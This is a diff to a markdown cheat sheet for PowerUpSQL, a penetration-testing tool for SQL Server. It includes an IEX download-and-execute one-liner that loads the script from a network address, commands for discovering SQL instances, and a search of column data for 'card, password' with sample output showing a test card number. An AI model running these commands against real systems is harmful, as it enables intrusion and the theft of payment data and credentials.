@@ -21,6 +21,30 @@ Or load into memory
 IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.0.1/PowerUpSQL.ps1")
 ```
 
+## Commands:
+
+### Find information on local server
+
+`PS C:>Get-SQLInstanceLocal | Get-SQLServerInfo`
+
+Test Connection to a server
+
+`Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose –Threads 1`0
+
+`Search data in SQL instance:`
+
+```text
+PS C:\> Get-SQLInstanceLocal | Get-SQLColumnSampleDataThreaded –Verbose –Threads 10 –Keyword “card, password” 
+
+ComputerName   Instance                   Database Schema Table    Column Sample           RowCount IsCC
+------------   --------                   -------- ------ -----    ------ ------           -------- ----
+SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   4111111111111111 2        True
+SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   41111111111ASDFD 2        False
+
+```
+
+## Cheatsheet
+
 ### SQL Server Discovery Cheats
 
 | Description | Command |
